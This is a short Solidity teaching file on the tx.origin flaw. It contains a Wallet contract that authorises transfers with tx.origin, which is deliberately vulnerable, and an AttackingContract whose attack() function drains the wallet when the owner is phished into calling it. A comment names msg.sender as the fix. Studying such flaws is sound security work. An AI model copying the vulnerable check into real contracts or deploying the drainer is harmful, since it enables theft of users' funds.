// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/*
Here we are taking advantage of the use of tx.origin to steal eth stored in 
a contract by a user. In the Wallet contract only the owner should be able to 
use Wallet.transfer(). tx.origin is used to ensure it is the owner performing  
the transfer. If the user were to call AttackingContract.attack() against his will 
(with phishing) the transfer would go through since tx.origin is equal to the 
address of the user. A fix would be to use msg.sender instead of tx.origin.
*/

contract Wallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() public payable {}

    // user -> Wallet.transfer() => tx.origin = user
    // user -> malicious contract -> Wallet.transfer() => tx.origin = user
    function transfer(address payable _to, uint256 _amount) public {
        // ensure it is the owner performing the transfer
        require(tx.origin == owner);
        (bool success, ) = _to.call{value: _amount}("");
        require(success, "Failed to send eth");
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract AttackingContract {
    // address that will receive eth from Wallet.transfer()
    address payable public owner;

    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = _wallet;
        owner = payable(msg.sender);
    }

    // the function we want the user to call
    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
